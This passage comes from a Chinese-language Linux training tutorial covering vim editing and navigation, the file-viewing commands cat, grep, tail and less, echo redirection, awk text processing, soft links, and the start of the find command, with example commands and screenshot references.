正常保存退出**\r\n\r\n![1576655592207](./img/linux/java-linux/Linux-v10-02天-授课/1576655592207.png)\r\n\r\n退出后显示【已写入】\r\n\r\n**以下为其他的退出模式：**\r\n\r\n:q            当vim进入文件没有对文件内容做任何操作可以按"q"退出\r\n\r\n:q!           当vim进入文件对文件内容有操作但不想保存退出\r\n\r\n:wq          正常保存退出\r\n\r\n:wq!         强行保存退出，只针对与root用户或文件所有人生\r\n\r\n> 总结\r\n>\r\n> 三种模式的切换，其实就完成了文件创建、编辑、保存、退出四个步骤\r\n>\r\n> 那么接下来，我们学习下一个命令\r\n>\r\n> 查看刚才新创建的文件\r\n\r\n### 1.2.5 文件查看\r\n\r\n```\r\n比如查看一个txt文档，在windows中，我们通常是打开一个文件，通过鼠标滚动查看文件不同节选的内容，而在Linux中，通过下面的命令，可以减少在Windows中手工查找的步骤，在Linux中通过命令+参数的形式进行定位查看、搜索查看\r\n```\r\n\r\n以下5个为文件查看命令，**我们只讲4个常用的命令，head不在赘述**\r\n\r\n| 序号 | 命令               | 对应英文    | 作用                             |\r\n| ---- | ------------------ | ----------- | -------------------------------- |\r\n| 01   | cat 文件名         | concatenate | 查看小文件内容                   |\r\n| 02   | less -N 文件名     | less        | **分频** 显示大文件内容          |\r\n| 03   | head -n 文件名     |             | 查看文件的**前一**部分           |\r\n| 04   | tail -n 文件名     |             | 查看文件的**最后**部分           |\r\n| 05   | grep 关键字 文件名 | grep        | 根据**关键词**, 搜索文本文件内容 |\r\n\r\n> 总结：\r\n>\r\n> 以上5个命令都可以查询文件的内容，他们的功能如下\r\n>\r\n> 通过 `cat` 会一次显示所有的内容, 适合 **查看内容较少** 的文本文件\r\n>\r\n> `less` 命令适合查看 **内容较多** 的文本文件\r\n>\r\n> 通过 `head` 命令查看文档的前几行内容\r\n>\r\n> 通过 `tail -10f 文件` 命令 查看文档(日志)的后几行内容\r\n>\r\n> 通过 `grep` 命令 搜索存在 **关键字** 的行\r\n\r\n#### **1) cat命令**\r\n\r\n```\r\n使用cat命令类似于我们在Windows中查看小型（太大的时候打开会卡死）的文件，cat常用的功能其实就等价于Windows中的\r\ntxt---打开--查看\r\n```\r\n\r\ncat 是一个文本文件查看和连接工具。查看一个文件的内容，用cat比较简单，就是cat 后面直接接文件名，如cat txtFiles.txt\r\n\r\n**使用者权限：当前文件的权限用户**\r\n\r\n**语法格式**\r\n\r\n```\r\ncat [-AbeEnstTuv] [--help] [--version] fileName\r\n```\r\n\r\n**查看文件名为txtfile.txt的内容**\r\n\r\n```shell\r\ncat txtfile.txt\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576657358085](./img/linux/java-linux/Linux-v10-02天-授课/1576657358085.png)\r\n\r\n**查看文件名为txtfile.txt的内容（加入行号）**\r\n\r\n```shell\r\ncat -n txtfile.txt\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576657409815](./img/linux/java-linux/Linux-v10-02天-授课/1576657409815.png)\r\n\r\n#### 2) grep命令\r\n\r\n```\r\ngrep命令在使用的时候类似于我们的程序中的查询，或者在txt文档中通过ctr+f查找\r\ngrep除了能对文件操作为还可以查看我们的进程信息，类似于我们在Windows系统的任务管理器（任务栏--右键---启动任务管理器--进程）下的进程\r\n```\r\n\r\ngrep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。\r\n\r\ngrep 命令用于查找文件里符合条件的字符串，语法如下：\r\n\r\n```\r\ngrep [-abcEFGhHilLnqrsvVwxy][-A<显示列数>][-B<显示列数>][-C<显示列数>][-d<进行动作>][-e<范本样式>][-f<范本文件>][--help][范本样式][文件或目录...]\r\n```\r\n\r\n**使用者权限：当前文件的权限用户**\r\n\r\n我们还是使用上面的txtfile.txt文件，如下图\r\n\r\n![1576664862829](./img/linux/java-linux/Linux-v10-02天-授课/1576664862829.png)\r\n\r\n> 为了测试效果，我们新增了其他数据\r\n>\r\n> 增加过程不在赘述\r\n\r\n1、搜索 **存在关键字【eeee】** 的行的文件\r\n\r\n```shell\r\ngrep eeee txtfile.txt \r\n```\r\n\r\n执行效果如下\r\n\r\n![1576664910366](./img/linux/java-linux/Linux-v10-02天-授课/1576664910366.png)\r\n\r\n2、搜索 **存在关键字【eeee】** 的行 且 **显示行号**\r\n\r\n```shell\r\ngrep -n eeee txtfile.txt \r\n```\r\n\r\n![1576665113269](./img/linux/java-linux/Linux-v10-02天-授课/1576665113269.png)\r\n\r\n3、**忽略大小写** 搜索 **存在关键字** 的行\r\n\r\n```shell\r\ngrep -i EEEE txtfile.txt \r\n```\r\n\r\n执行效果如下\r\n\r\n![1576666861596](./img/linux/java-linux/Linux-v10-02天-授课/1576666861596.png)\r\n\r\n4、搜索 **不存在关键字** 的行\r\n\r\n```shell\r\ngrep -v 中国 txtfile.txt \r\n```\r\n\r\n执行效果如下\r\n\r\n![1576666928266](./img/linux/java-linux/Linux-v10-02天-授课/1576666928266.png)\r\n\r\n**5、查找指定的进程信息（包含grep进程）**\r\n\r\n```shell\r\nps -ef | grep  sshd\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577095621215](./img/linux/java-linux/Linux-v10-02天-授课/1577095621215.png)\r\n\r\n> 说明\r\n>\r\n> 除最后一条记录外，其他的都是查找出的进程；最后一条记录结果是grep进程本身，并非真正要找的进程\r\n\r\n**6、查找指定的进程信息（不包含grep进程）**\r\n\r\n```shell\r\nps aux | grep sshd | grep -v "grep"\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577095998308](./img/linux/java-linux/Linux-v10-02天-授课/1577095998308.png)\r\n\r\n**7、查找进程个数**\r\n\r\n```shell\r\n ps -ef|grep -c sshd\r\n```\r\n\r\n 执行效果如下\r\n\r\n![1577096070670](./img/linux/java-linux/Linux-v10-02天-授课/1577096070670.png)\r\n\r\n由上图可知sshd的进程个数为4（包含grep进程本身）\r\n\r\n#### 3) tail命令\r\n\r\n```\r\ntail命令类似于我们在windows中通过鼠标手工查找，比如查看文件最后10行，从第2行一直查看到文件末尾，或者只查看文件末尾的一些信息，这些windows中都是通过人为干预的方式进行查找，在Linux中我们可以通过tail命令实现\r\n```\r\n\r\ntail 命令可用于查看文件的内容，有一个常用的参数 **-f** 常用于查阅正在改变的日志文件。\r\n\r\n**tail -f filename** 会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。\r\n\r\n**使用者权限：当前文件的权限用户**\r\n\r\n**命令格式：**\r\n\r\n```shell\r\ntail [参数] [文件]  \r\n```\r\n\r\n**1、要显示 txtfile.txt  文件的最后 3 行，请输入以下命令：**\r\n\r\n```shell\r\ntail -3 txtfile.txt \r\n```\r\n\r\n原始文件内容如下\r\n\r\n![1576667678964](./img/linux/java-linux/Linux-v10-02天-授课/1576667678964.png)\r\n\r\n最后3行内容如下\r\n\r\n![1576667701796](./img/linux/java-linux/Linux-v10-02天-授课/1576667701796.png)\r\n\r\n**2、动态显示文档的最后内容,一般用来查看日志，请输入以下命令：**\r\n\r\n```shell\r\ntail -f txtfile.txt\r\n```\r\n\r\n执行效果如下：\r\n\r\n![1576667811261](./img/linux/java-linux/Linux-v10-02天-授课/1576667811261.png)\r\n\r\n此命令显示 txtfile.txt 文件的最后 10 行。当将某些行添加至 txtfile.txt 文件时，tail 命令会继续显示这些行。 显示一直继续，直到您按下（Ctrl-C）组合键停止显示。\r\n\r\n如果要显示最后4行，命令如下：\r\n\r\n```shell\r\ntail -4f txtfile.txt\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576719306123](./img/linux/java-linux/Linux-v10-02天-授课/1576719306123.png)\r\n\r\n**3、显示文件txtfile.txt 的内容，从第 2 行至文件末尾**\r\n\r\n```shell\r\ntail  -n +2  txtfile.txt\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576719057889](./img/linux/java-linux/Linux-v10-02天-授课/1576719057889.png)\r\n\r\n**4、显示文件 txtfile.txt的最后 10 个字符:**\r\n\r\n```shell\r\ntail -c 45 txtfile.txt\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576719098586](./img/linux/java-linux/Linux-v10-02天-授课/1576719098586.png)\r\n\r\n> 总结\r\n>\r\n> 在tail使用的过程中，我们使用最多的就是查看文件末尾多多少行\r\n>\r\n> 使用tail -nf txtfile.txt\r\n>\r\n> 通常都是在查看日志信息（报错调试时使用）\r\n\r\n#### 4）less命令\r\n\r\n```\r\nless命令也是查看文件的，只不过它适合查看 内容较多的文本文件，它也可以用于分屏显示文件内容,  每次只显示一页内容，有点类似我们做分页查询\r\n```\r\n\r\nless用于查看文件，但是less 在查看之前不会加载整个文件。\r\n\r\n**使用者权限：当前文件的权限用户**\r\n\r\n**语法**\r\n\r\n```shell\r\nless [参数] 文件 \r\n```\r\n\r\n1、查看txtfile.txt文件\r\n\r\n```shell\r\nless txtfile.txt\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576720622842](./img/linux/java-linux/Linux-v10-02天-授课/1576720622842.png)\r\n\r\n2、查看命令历史使用记录并通过less分页显示\r\n\r\n```shell\r\n[itcast@localhost ~]$  history | less\r\n    1  ifconfig\r\n    2  reboot\r\n    3  ifconfig\r\n    4  reboot\r\n    5  ifconfig\r\n    6  su root\r\n    7  ifconfig\r\n    8  ping  www.baidu.com\r\n    9  \\\r\n   10  ifconfig\r\n   11  date\r\n   12  hwclock --systohc\r\n   13  su root\r\n   \r\n   ......略\r\n```\r\n\r\n我们输入【j】可以前进行\r\n\r\n​        输入【k】可以后退行\r\n\r\n​        输入【G】可以 移动到最后一行\r\n\r\n​\t    输入【g】可以移动到第一行\r\n\r\n​        输入【ctrl + F】 向前移动一屏(类似于我们在浏览器中的数据分页的下一页)\r\n\r\n​        输入【ctrl + B】 向后移动一屏(类似于我们在浏览器中的数据分页的上一页)\r\n\r\n**其他命令**\r\n\r\n1.全屏导航\r\n\r\n- ctrl + F - 向前移动一屏\r\n- ctrl + B - 向后移动一屏\r\n- ctrl + D - 向前移动半屏\r\n- ctrl + U - 向后移动半屏\r\n\r\n2.单行导航\r\n\r\n- j - 向前移动一行\r\n- k - 向后移动一行\r\n\r\n3.其它导航\r\n\r\n- G - 移动到最后一行\r\n- g - 移动到第一行\r\n- q / ZZ - 退出 less 命令\r\n\r\n### 1.2.6  vim定位行\r\n\r\n```\r\n在日常工作中,有可能会遇到打开一个文件,并定位到指定行的情况\r\n例如: 在开发时, 知道某一行代码有错误,可以快速定位到出错误代码的位置\r\n这个时候,可以使用以下命令打开文件\r\n```\r\n\r\n由于我们这里还没有学到上传文件的命令，所以我们这里还是使用上面的txtfile.txt例子，我们打开文件定位到第6行，如下：\r\n\r\n```shell\r\nvim txtfile.txt +6\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576659165723](./img/linux/java-linux/Linux-v10-02天-授课/1576659165723.png)\r\n\r\n### **1.2.7 异常处理**\r\n\r\n- 如果 vim异常退出, 在磁盘上可能会保存有 交换文件\r\n- 下次再使用 vim 编辑文件时, 会看到以下屏幕信息,\r\n\r\n![1576658330514](./img/linux/java-linux/Linux-v10-02天-授课/1576658330514.png)\r\n\r\n解决方案：\r\n\r\n将后缀名为.swp的文件删除即可恢复\r\n\r\n![1576658480811](./img/linux/java-linux/Linux-v10-02天-授课/1576658480811.png)\r\n\r\n再次编辑文件不在出现提示警告！\r\n\r\n\r\n\r\n### 1.2.8 操作扩展\r\n\r\n要熟练使用vi/vim, 首先应该学会怎么在 命令模式下 快速移动光标\r\n编辑操作命令 能够和移动命令一起使用\r\n\r\n**1) 上 下 左 右**\r\n\r\n![1558278451153](./img/linux/java-linux/Linux-v10-02天-授课/1558278451153.png)\r\n\r\n| 命令 | 功能 | 手指   |\r\n| ---- | ---- | ------ |\r\n| h    | 向左 | 食指   |\r\n| j    | 向下 | 食指   |\r\n| k    | 向上 | 中指   |\r\n| l    | 向右 | 无名指 |\r\n\r\n也可以使用键盘上的上下左右箭头，这个更有方向感。\r\n\r\n**2) 行内移动**\r\n\r\n| 命令 | 英文 | 功能                           |\r\n| ---- | ---- | ------------------------------ |\r\n| w    | word | 向后移动一个单词               |\r\n| b    | back | 向前移动一个单词               |\r\n| 0    |      | 行首                           |\r\n| ^    |      | 行首, 第一个不是空白字符的位置 |\r\n| $    |      | 行尾                           |\r\n\r\n**3) 行数移动**\r\n\r\n| 命令   | 英文 | 功能                  |\r\n| ------ | ---- | --------------------- |\r\n| gg     | go   | 文件顶部              |\r\n| G      | go   | 文件末尾              |\r\n| 数字gg | go   | 移动到 数字 对应行数  |\r\n| 数字G  | go   | 移动到 数字 对应行数  |\r\n| : 数字 |      | 移动到数字对应的 行数 |\r\n\r\n**4) 屏幕移动**\r\n\r\n| 命令     | 英文    | 功能     |\r\n| -------- | ------- | -------- |\r\n| Ctrl + b | back    | 向上翻页 |\r\n| Ctrl + f | forward | 向下翻页 |\r\n| H        | Head    | 屏幕顶部 |\r\n| M        | Middle  | 屏幕中间 |\r\n| L        | Low     | 屏幕底部 |\r\n\r\n**5) 选中文本(可视模式)**\r\n\r\n- 学习 复制 命令前, 应该先学会 **怎么样选中 要复制的代码**\r\n- 在 vi/vim 中要选择文本, 需要显示 visual 命令切换到 **可视模式**\r\n- vi/vim 中提供了 **三种** 可视模式, 可以方便程序员的选择 **选中文本的方式**\r\n- 按 ESC 可以放弃选中, 返回到 **命令模式**\r\n\r\n| 命令     | 模式       | 功能                               |\r\n| -------- | ---------- | ---------------------------------- |\r\n| v        | 可视模式   | 从光标位置开始按照正常模式选择文本 |\r\n| V        | 可视化模式 | 选中光标经过的完整行               |\r\n| Ctrl + v | 可是块模式 | 垂直方向选中文本                   |\r\n\r\n**6) 撤销和恢复撤销(保命指令)**\r\n\r\n在学习编辑命令之前,先要知道怎样撤销之前一次 错误的 编辑操作\r\n\r\n| 命令     | 英文  | 功能                     |\r\n| -------- | ----- | ------------------------ |\r\n| u        | undo  | 撤销上次的命令(ctrl + z) |\r\n| Ctrl + r | uredo | 恢复撤销的命令           |\r\n\r\n**7) 删除文本**\r\n\r\n| 命令        | 英文   | 功能                              |\r\n| ----------- | ------ | --------------------------------- |\r\n| x           | cut    | 删除光标所在的字符,或者选中的文字 |\r\n| d(移动命令) | delete | 删除移动命令对应的内容            |\r\n| dd          | delete | 删除光标所在行, 可以删除多行      |\r\n| D           | delete | 删除至行尾                        |\r\n\r\n提示: 如果使用 可视模式 已经选中了一段文本, 那么无论使用 d 还是 x, 都可以删除选中文本\r\n\r\n删除命令可以和移动命令连用, 以下是常见的组合命令(扩展):\r\n\r\n| 命令 | 作用                        |\r\n| ---- | --------------------------- |\r\n| dw   | 从光标位置删除到单词末尾    |\r\n| d}   | 从光标位置删除到段落末尾    |\r\n| ndd  | 从光标位置向下连续删除 n 行 |\r\n\r\n**8) 复制和剪切**\r\n\r\n- vi/vim 中提供有一个 被复制文本的缓冲区\r\n  - 复制 命令会将选中的文字保存在缓冲区\r\n  - 删除 命令删除的文字会被保存在缓冲区\r\n  - 在需要的位置, 使用 粘贴 命令可以将缓冲对的文字插入到光标所在的位置\r\n\r\n| 命令        | 英文   | 功能                       |\r\n| ----------- | ------ | -------------------------- |\r\n| yy          | copy   | 复制行                     |\r\n| d(剪切命令) | delete | 剪切                       |\r\n| dd(剪切)    | delete | 剪切一行, 可以 ndd 剪切n行 |\r\n| p           | paste  | 粘贴                       |\r\n\r\n提示:\r\n\r\n- 命令 d 、x 类似于图形界面的 **剪切操作**  -- ctrl + x\r\n- 命令 y 类似于 图形界面的 **复制操作** -- Ctrl + \r\n- 命令 p 类似于图形界面的 **粘贴操作** -- Ctrl + v\r\n- vi中的文本缓冲区只有一个,如果后续做过 复制、剪切操作, 之前缓冲区中的内容会被替换.\r\n\r\n注意\r\n\r\n- vi中的 **文本缓冲区** 和 系统的 **剪切板** 不是同一个\r\n- 所以在其他软件中使用 `Ctrl + C` 复制的内容, 不能再 `vi` 中通过 `p` 命令粘贴\r\n- 可以在 **编辑模式** 下使用 **鼠标右键粘贴**\r\n\r\n**9) 替换**\r\n\r\n| 命令 | 英文    | 功能                   | 工作模式 |\r\n| ---- | ------- | ---------------------- | -------- |\r\n| r    | replace | 替换当前字符           | 命令模式 |\r\n| R    | replace | 替换当前行光标后的字符 | 替换模式 |\r\n\r\n- `R` 命令可以进入 **替换模式**, 替换完成后, 按下`ESC` , 按下 `ESC` 可以回到 **命令模式**\r\n- **替换命令** 的作用就是不用进入 **编辑模式**, 对文件进行 **轻量级的修改**\r\n\r\n**10) 缩排和重复执行**\r\n\r\n| 命令 | 功能         |\r\n| ---- | ------------ |\r\n| >>   | 向右增加缩进 |\r\n| <<   | 向左减少缩进 |\r\n| .    | 重复上次命令 |\r\n\r\n- **缩进命令** 在开发程序时, **统一增加代码的缩进** 比较有用!\r\n  - 一次性 **在选中代码前增加 4 个空格,**  就叫做 **增加缩进**\r\n  - 一次性 **在选中代码前删除 4 个空格**,  就叫做 **较少缩进**\r\n- 在 **可视模式** 下, 缩排命令 主需要使用 一个 `>` 或者 `<`\r\n\r\n在程序中, **缩进** 通常用来表示代码的归属关系\r\n\r\n- **前面空格越少, 代码的级别越高**\r\n- **前面空格越多, 代码的级别越低**\r\n\r\n**11) 查找**\r\n\r\n常规查找\r\n\r\n| 命令 | 功能    |\r\n| ---- | ------- |\r\n| /str | 查找str |\r\n\r\n- 查找到指定内容之后, 使用 `Next` 查找下一个出现的位置\r\n  - `n` : 查找下一个\r\n  - `N` : 查找上一个\r\n- 如果不想看到高亮显示, 可以随便查找一个文件中不存在的内容即可\r\n\r\n- 单词快速匹配\r\n\r\n| 命令 | 功能                     |\r\n| ---- | ------------------------ |\r\n| *    | 向后查找当前光标所在单词 |\r\n| #    | 向前查找当前光标所在单词 |\r\n\r\n- 在开发中, 通过单词快速匹配, 可以快速看到这个单词在其他位置使用过\r\n\r\n**12) 查找并替换**\r\n\r\n- 在 `vi/vim` 中查找和替换命令需要在 **末行模式** 下执行\r\n- 记忆命令格式\r\n\r\n```\r\n:%s///g\r\n```\r\n\r\n1)  全局替换\r\n\r\n- 一次向 替换文件中的 所有出现的旧文本\r\n\r\n- 命令格式如下\r\n\r\n  ```\r\n  :%s/旧文本/新文本/g\r\n  ```\r\n\r\n2) 可视区域替换\r\n\r\n- **先选中** 要替换文字的 **范围**\r\n- 命令格式如下\r\n\r\n```\r\n:s/旧文本/新文本/g\r\n```\r\n\r\n3) 确认替换：\r\n\r\nc confirm 确认\r\n\r\n- 如果把末尾的 `g` 改成 `gc`  在替换的时候, 会有提示! 推荐使用\r\n\r\n- 命令格式如下\r\n\r\n  ```\r\n  :%s/旧文本/新文本/gc\r\n  ```\r\n\r\n1. `y` - `yes` 替换\r\n2. `n` - `no` 不替换\r\n3. `a` - `all` 替换所有\r\n4. `q` -`quit` 退出替换\r\n5. `l` - `last` 最后一个, 并把光标移动到行首\r\n6. `^E` 向下滚屏\r\n7. `^Y` 向上滚屏\r\n\r\n## 1.3 echo 命令\r\n\r\n```\r\necho命令有点类似于我们在java se阶段学习的 System.out.print("hello")\r\n但是，echo还有一个功能就是追加文件内容到文件，类似于我们在java se阶段学习的append文件流写入一样\r\n```\r\n\r\n**使用者权限：所有用户**\r\n\r\n- `echo string` 将字符串输出到控制台 ,  通常和 **重定向** 联合使用\r\n\r\n```\r\necho hello world\r\n\r\n# 如果字符串有空格, 为了避免歧义 请增加 双引号 或者 单引号\r\necho "hello world"\r\n```\r\n\r\n**6.3 重定向 `>`(覆盖) 和 `>>` (追加)** \r\n\r\n![1558435686066](./img/linux/java-linux/Linux-v10-02天-授课/1558435686066-1576721493121.png)\r\n\r\n- 默认情况下 **命令的结果** 输出到 **控制台**\r\n- 通过 **重定向** 可以将结果 **输出到文件**\r\n\r\n**6.2.3 实现**\r\n\r\n- **第一步: 将命令的成功结果 覆盖 指定文件内容**\r\n\r\n```\r\n echo  传智博客 >czbk-txt.txt\r\n```\r\n\r\n执行结果如下（czbk-txt.txt文件如果没有会自动创建）\r\n\r\n![1576721910460](./img/linux/java-linux/Linux-v10-02天-授课/1576721910460.png)\r\n\r\n| 命令          | 作用                               |\r\n| ------------- | ---------------------------------- |\r\n| 结果 > 文件名 | `>` 表示输出, 会覆盖文件的原有内容 |\r\n\r\n- ##### 第二步: 将**命令的成功结果** **追加**  指定文件的后面\r\n\r\n```\r\necho  黑马程序员 >> czbk-txt.txt\r\n```\r\n\r\n执行结果如下\r\n\r\n![1576721980097](./img/linux/java-linux/Linux-v10-02天-授课/1576721980097.png)\r\n\r\n| 命令           | 作用                                        |\r\n| -------------- | ------------------------------------------- |\r\n| 命令 >> 文件名 | `>>` 表示追加, 会将内容追加到已有文件的末尾 |\r\n\r\n- ##### 第三步: 将**命令的失败结果** **追加** 指定文件的后面\r\n\r\n```\r\ncat 不存在的目录  &>>  error.log\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576722167942](./img/linux/java-linux/Linux-v10-02天-授课/1576722167942.png)\r\n\r\n| 命令             | 作用                                   |\r\n| ---------------- | -------------------------------------- |\r\n| 命令  `&>>` 文件 | `&>>` 表示不区分错误类型 都放到 日志中 |\r\n\r\n> 总结\r\n>\r\n> - 通过 `命令 > 文件`  将**命令的成功结果** **覆盖** 指定文件内容\r\n> - 通过 `命令 >> 文件`   将**命令的成功结果** **追加**  指定文件的后面\r\n> - 通过 `命令 &>> 文件` 将 **命令的失败结果** **追加** 指定文件的后面\r\n\r\n## 1.4 awk命令\r\n\r\nAWK是一种处理文本文件的语言，是一个强大的文本分析工具。\r\n\r\n之所以叫AWK是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符。\r\n\r\n**具体语法如下**\r\n\r\n```shell\r\nawk [选项参数] \'script\' var=value file(s)\r\n或\r\nawk [选项参数] -f scriptfile var=value file(s)\r\n```\r\n\r\n**1、数据准备：czbk-txt.txt文本内容如下：**\r\n\r\n```shell\r\nzhangsan 68 99 26\r\nlisi 98 66 96\r\nwangwu 38 33 86\r\nzhaoliu 78 44 36\r\nmaq 88 22 66\r\nzhouba 98 44 46\r\n```\r\n\r\n **2、搜索含有 zhang  和 li 的学生成绩：**\r\n\r\n```shell\r\ncat czbk-txt.txt | awk \'/zhang|li/\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577178031588](./img/linux/java-linux/Linux-v10-02天-授课/1577178031588.png)\r\n\r\n**指定分割符, 根据下标显示内容**\r\n\r\n| 命令                                        | 含义                                                         |\r\n| ------------------------------------------- | ------------------------------------------------------------ |\r\n| awk   -F  \',\'    \'{print $1, $2, $3}\'  文件 | 操作1.txt文件,  根据 逗号 分割, 打印 第一段 第二段 第三段 内容 |\r\n\r\n选项\r\n\r\n| 选项       | 英文            | 含义                     |\r\n| ---------- | --------------- | ------------------------ |\r\n| `-F \',\'`   | field-separator | 使用 **指定字符** 分割   |\r\n| `$ + 数字` |                 | 获取**第几段**内容       |\r\n| `$0`       |                 | 获取 **当前行** 内容     |\r\n| `NF`       | field           | 表示当前行共有多少个字段 |\r\n| `$NF`      |                 | 代表 最后一个字段        |\r\n| `$(NF-1)`  |                 | 代表 倒数第二个字段      |\r\n| `NR`       |                 | 代表 处理的是第几行      |\r\n\r\n```\r\n# 查看文档内容\r\ncat czbk-txt.txt \r\n#直接输出\r\ncat score.txt | awk -F \' \' \'{print $1,$2,$3}\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577178523300](./img/linux/java-linux/Linux-v10-02天-授课/1577178523300.png)\r\n\r\n**指定分割符, 根据下标显示内容**\r\n\r\n| 命令                                                    | 含义                                                         |\r\n| ------------------------------------------------------- | ------------------------------------------------------------ |\r\n| awk   -F  \' \'    \'{OFS="==="}{print $1, $2, $3}\'  1.txt | 操作1.txt文件,  根据 逗号 分割, 打印 第一段 第二段 第三段 内容 |\r\n\r\n选项\r\n\r\n| 选项         | 英文                   | 含义                     |\r\n| ------------ | ---------------------- | ------------------------ |\r\n| `OFS="字符"` | output field separator | 向外输出时的段分割字符串 |\r\n\r\n| 转义序列 | 含义   |\r\n| -------- | ------ |\r\n| \\b       | 退格   |\r\n| \\f       | 换页   |\r\n| \\n       | 换行   |\r\n| \\r       | 回车   |\r\n| \\t       | 制表符 |\r\n\r\n```\r\n# 按照 === 进行分割, 打印 第一段 第二段 第三段\r\ncat  czbk-txt.txt | awk -F \' \' \'{OFS="==="}{print $1,$2,$3}\'\r\n# 按照 制表符tab 进行分割, 打印 第一段 第二段 第三段\r\ncat czbk-txt.txt| awk -F \' \' \'{OFS="\\t"}{print $1,$2,$3}\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577178563336](./img/linux/java-linux/Linux-v10-02天-授课/1577178563336.png)\r\n\r\n![1577179227699](./img/linux/java-linux/Linux-v10-02天-授课/1577179227699.png)\r\n\r\n**调用 awk 提供的函数**\r\n\r\n| 命令                                           | 含义                                                         |\r\n| ---------------------------------------------- | ------------------------------------------------------------ |\r\n| awk   -F  \',\'    \'{print  toupper($2)}\'  1.txt | 操作1.txt文件,  根据 逗号 分割, 打印 第一段 第二段 第三段 内容 |\r\n\r\n常用函数如下:\r\n\r\n| 函数名    | 含义   | 作用           |\r\n| --------- | ------ | -------------- |\r\n| toupper() | upper  | 字符 转成 大写 |\r\n| tolower() | lower  | 字符 转成小写  |\r\n| length()  | length | 返回 字符长度  |\r\n\r\n```\r\n# 打印第一段内容\r\n cat czbk-txt.txt | awk -F \' \' \'{print $1}\'\r\n# 将第一段内容转成大写 且 显示 \r\n cat czbk-txt.txt | awk -F \' \' \'{print toupper($1)}\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577180402362](./img/linux/java-linux/Linux-v10-02天-授课/1577180402362.png)\r\n\r\n**求指定学科平均分**\r\n\r\n| 命令                                                         | 含义                                                         |\r\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\r\n| awk \'BEGIN{初始化操作}{每行都执行} END{结束时操作}\'   文件名 | BEGIN{ 这里面放的是执行前的语句 }<br />{这里面放的是处理每一行时要执行的语句}<br />END {这里面放的是处理完所有的行后要执行的语句 } |\r\n\r\n**查看czbk-txt.txt 文件内容**\r\n\r\n```shell\r\ncat czbk-txt.txt \r\n```\r\n\r\n执行效果如下\r\n\r\n![1577180698120](./img/linux/java-linux/Linux-v10-02天-授课/1577180698120.png)\r\n\r\n**查看总分**\r\n\r\n注意：这里计算的是第4列的总分\r\n\r\n```shell\r\ncat czbk-txt.txt| awk -F \' \' \'BEGIN{}{total=total+$4} END{print total}\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577180583110](./img/linux/java-linux/Linux-v10-02天-授课/1577180583110.png)\r\n\r\n**查看总分, 总人数**\r\n\r\n注意：这里计算的是第4列的\r\n\r\n```shell\r\ncat czbk-txt.txt| awk -F \' \' \'BEGIN{}{total=total+$4} END{print total, NR}\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577180635136](./img/linux/java-linux/Linux-v10-02天-授课/1577180635136.png)\r\n\r\n**查看总分, 总人数, 平均分**\r\n\r\n注意：这里计算的是第4列的\r\n\r\n```shell\r\n cat czbk-txt.txt | awk -F \' \' \'BEGIN{}{total=total+$4} END{print total, NR, (total/NR)}\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577180660454](./img/linux/java-linux/Linux-v10-02天-授课/1577180660454.png)\r\n\r\n> 总结\r\n>\r\n> awk在使用过程中主要用作分析\r\n>\r\n> 简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理\r\n\r\n## 1.5  软连接\r\n\r\n```\r\n软连接其实就类似于我们在Windows中的【快捷方式】\r\n```\r\n\r\n- 在Linux**文件名** 和 **内容** 是两个文件, 分开的!![1558439106175](./img/linux/java-linux/Linux-v10-02天-授课/1558439106175.png)\r\n\r\n\r\n\r\n- 创建软链接的原理, 如下![1558439158250](./img/linux/java-linux/Linux-v10-02天-授课/1558439158250.png)\r\n\r\n  为什么有软连接？\r\n\r\n  因为 某些文件和目录 的 **路径很深**, 所以 需要增加 **软链接(快捷方式)**\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法如下:**\r\n\r\n| 命令                                      | 英文 | 作用                                         |\r\n| ----------------------------------------- | ---- | -------------------------------------------- |\r\n| ln **-s**  目标文件绝对路径  快捷方式路径 | link | 给目标文件增加一个软链接, 通俗讲就是快捷方式 |\r\n\r\n**给home/itcast/txtfile.txt文件增加软连接**\r\n\r\n```shell\r\n ln  -s /home/itcast/txtfile.txt    czbk-txt\r\n```\r\n\r\n上面；我们将/home/itcast/路径下的txtfile.txt文件增加软连接到\r\n\r\nczbk-txt，然后通过cat 访问czbk-txt也是可以正常访问的\r\n\r\n如下图\r\n\r\n![1576723058556](./img/linux/java-linux/Linux-v10-02天-授课/1576723058556.png)\r\n\r\n> 总结\r\n>\r\n> 通过 `ln -s 源文件的绝对路径 其实就是给**目标文件** 增加 **快捷方式**\r\n\r\n## 1.6 find查找\r\n\r\n```\r\n引子\r\nfind命令类似与在Windows中全局查找（如下图）\r\n```\r\n\r\n![1576828863833](./img/linux/java-linux/Linux-v10-02天-授课/1576828863833.png)\r\n\r\n**find概念**\r\n\r\nfind命令用来在指定目录下查找文件。\r\n\r\n任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。\r\n\r\n**语法**\r\n\r\n```shell\r\nfind <指定目录> <指定条件> <指定内容>\r\n```\r\n\r\n**1、将目前目录及其子目录下所有延伸档名是 gz 的文件查询出来** \r\n\r\n```shell\r\nfind . -name 